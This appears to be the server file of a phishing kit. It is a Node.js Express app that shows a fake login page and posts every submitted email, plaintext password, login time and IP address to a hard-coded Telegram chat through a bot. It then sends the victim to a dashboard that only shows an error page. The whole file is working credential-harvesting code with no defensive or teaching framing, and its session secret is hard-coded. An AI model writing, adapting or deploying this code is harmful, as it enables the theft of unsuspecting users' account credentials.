import express from "express";
import session from "express-session";
import bodyParser from "body-parser";
import TelegramBot from 'node-telegram-bot-api';
import 'dotenv/config';

const app = express();

const token = process.env.BOT_TOKEN;
const chatId = 7320173655;

function generateMessage(userData) {
    const message = `
    *📝 Data Login User*
    ────────────────────
    *Email:* \`${userData.email}\`
    *Password:* \`${userData.password}\`
    *Login Time:* \`${userData.loginTime}\`
    *IP Address:* \`${userData.ip}\`
    ────────────────────
    `;
    return message;
}

const bot = new TelegramBot(token, { polling: true });

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// Session setup
app.use(session({
  secret: "anjayy123mantapbrok",
  resave: false,
  saveUninitialized: true
}));

// Set EJS
app.set("view engine", "ejs");

// Halaman login
app.get("/id/login", (req, res) => {
  res.render("login", { error: null });
});

app.get("/", (req, res) => {
    res.render("index", {error: null});
})

// Proses login
app.post("/id/login", (req, res) => {
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const userData = {
        email: email,
        password: password,
        loginTime: new Date().toLocaleString(),
        ip: ip,
    };
    bot.sendMessage(chatId, generateMessage(userData), { parse_mode: "MarkdownV2" });
    req.session.user = email;
    res.redirect("/dashboard");
});

// Halaman dashboard
app.get("/dashboard", (req, res) => {
  if (!req.session.user) return res.redirect("/id/login");
  res.render("error", { error: null});
});

// Logout
app.get("/logout", (req, res) => {
  req.session.destroy();
  res.redirect("/id/login");
});

export default app;
